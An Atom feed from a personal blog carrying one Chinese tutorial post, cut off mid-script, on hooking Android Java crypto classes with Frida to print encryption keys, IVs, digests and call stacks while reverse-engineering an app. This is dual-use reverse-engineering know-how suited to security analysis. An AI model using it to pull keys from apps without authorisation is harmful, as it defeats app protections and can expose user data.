<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>B.Stark&#39;Blog</title>
  
  
  <link href="https://bstark.me/atom.xml" rel="self"/>
  
  <link href="https://bstark.me/"/>
  <updated>2022-04-01T06:30:45.647Z</updated>
  <id>https://bstark.me/</id>
  
  <author>
    <name>B Stark</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>frida Hook Java基础类中的所有加密类</title>
    <link href="https://bstark.me/posts/13156/"/>
    <id>https://bstark.me/posts/13156/</id>
    <published>2022-02-10T07:01:34.000Z</published>
    <updated>2022-04-01T06:30:45.647Z</updated>
    
    <content type="html"><![CDATA[<p>我们可以通过Hook Java基础类或第三方类库中的所有加密类来盲猜app用了哪种加密类。app用的加密类只要在我们Hook的类中，就可以判断出app用了哪种加密类，通过调用堆栈定位到加密代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printstack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(Java.use(<span class="string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;enter&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> Base64 = Java.use(<span class="string">&#x27;android.util.Base64&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> ByteString = Java.use(<span class="string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> secretKeySpec = Java.use(<span class="string">&#x27;javax.crypto.spec.SecretKeySpec&#x27;</span>);</span><br><span class="line">    secretKeySpec.$init.overload(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.$init(a, b);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;算法名：&quot;</span> + b + <span class="string">&quot;|str密钥:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;算法名：&quot;</span> + b + <span class="string">&quot;|Hex密钥:&quot;</span> + ByteString.of(a).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> DESKeySpec = Java.use(<span class="string">&#x27;javax.crypto.spec.DESKeySpec&#x27;</span>);</span><br><span class="line">    DESKeySpec.$init.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.$init(a);</span><br><span class="line">        <span class="keyword">var</span> bytes_key_des = <span class="built_in">this</span>.getKey();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;des密钥  |str &quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key_des));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;des密钥  |hex &quot;</span> + ByteString.of(bytes_key_des).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DESKeySpec.$init.overload(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.$init(a, b);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> bytes_key_des = <span class="built_in">this</span>.getKey();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;des密钥  |str &quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key_des));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;des密钥  |hex &quot;</span> + ByteString.of(bytes_key_des).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mac = Java.use(<span class="string">&#x27;javax.crypto.Mac&#x27;</span>);</span><br><span class="line">    mac.getInstance.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.getInstance(a);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;算法名：&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    mac.update.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="built_in">this</span>.update(a);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;update:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a))</span><br><span class="line">    &#125;</span><br><span class="line">    mac.update.overload(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="built_in">this</span>.update(a, b, c)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;update:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a) + <span class="string">&quot;|&quot;</span> + b + <span class="string">&quot;|&quot;</span> + c);</span><br><span class="line">    &#125;</span><br><span class="line">    mac.doFinal.overload().implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.doFinal();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;mac doFinal结果: |str  :&quot;</span>     + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(result));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;mac doFinal结果: |hex  :&quot;</span>     + ByteString.of(result).hex());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;mac doFinal结果: |base64  :&quot;</span>  + Base64.encodeToString(result,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    mac.doFinal.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.doFinal(a);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal参数: |str  :&quot;</span>     + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |str  :&quot;</span>     + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(result));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |hex  :&quot;</span>     + ByteString.of(result).hex());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |base64  :&quot;</span>  + Base64.encodeToString(result,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> md = Java.use(<span class="string">&#x27;java.security.MessageDigest&#x27;</span>);</span><br><span class="line">    md.getInstance.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;算法名：&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getInstance(a, b);</span><br><span class="line">    &#125;</span><br><span class="line">    md.getInstance.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;算法名：&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getInstance(a);</span><br><span class="line">    &#125;</span><br><span class="line">    md.update.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;update:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.update(a);</span><br><span class="line">    &#125;</span><br><span class="line">    md.update.overload(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;update:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a) + <span class="string">&quot;|&quot;</span> + b + <span class="string">&quot;|&quot;</span> + c);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.update(a, b, c);</span><br><span class="line">    &#125;</span><br><span class="line">    md.digest.overload().implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.digest();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;digest11结果:&quot;</span> + ByteString.of(result).hex());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;digest结果:&quot;</span> + Base64.encodeToString(result,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    md.digest.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;digest参数:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a));</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.digest(a);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;digest结果:&quot;</span> + ByteString.of(result).hex());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;digest结果:&quot;</span> + Base64.encodeToString(result,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> ivParameterSpec = Java.use(<span class="string">&#x27;javax.crypto.spec.IvParameterSpec&#x27;</span>);</span><br><span class="line">    ivParameterSpec.$init.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.$init(a);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;iv向量: |str:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;iv向量: |hex:&quot;</span> + ByteString.of(a).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> cipher = Java.use(<span class="string">&#x27;javax.crypto.Cipher&#x27;</span>);</span><br><span class="line">    cipher.getInstance.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.getInstance(a);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;模式填充:&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.Key&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.init(a, b);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bytes_key = b.getEncoded();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|str密钥:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key: |base64  :&quot;</span>  + Base64.encodeToString(bytes_key,<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|Hex密钥:&quot;</span> + ByteString.of(bytes_key).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.cert.Certificate&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.init(a, b);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.Key&#x27;</span>, <span class="string">&#x27;java.security.spec.AlgorithmParameterSpec&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.init(a, b, c);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bytes_key = b.getEncoded();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|str密钥:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key: |base64  :&quot;</span>  + Base64.encodeToString(bytes_key,<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|Hex密钥:&quot;</span> + ByteString.of(bytes_key).hex());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.cert.Certificate&#x27;</span>, <span class="string">&#x27;java.security.SecureRandom&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.init(a, b, c);</span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.Key&#x27;</span>, <span class="string">&#x27;java.security.SecureRandom&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.init(a, b, c);</span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bytes_key = b.getEncoded();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|str密钥:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key: |base64  :&quot;</span>  + Base64.encodeToString(bytes_key,<span 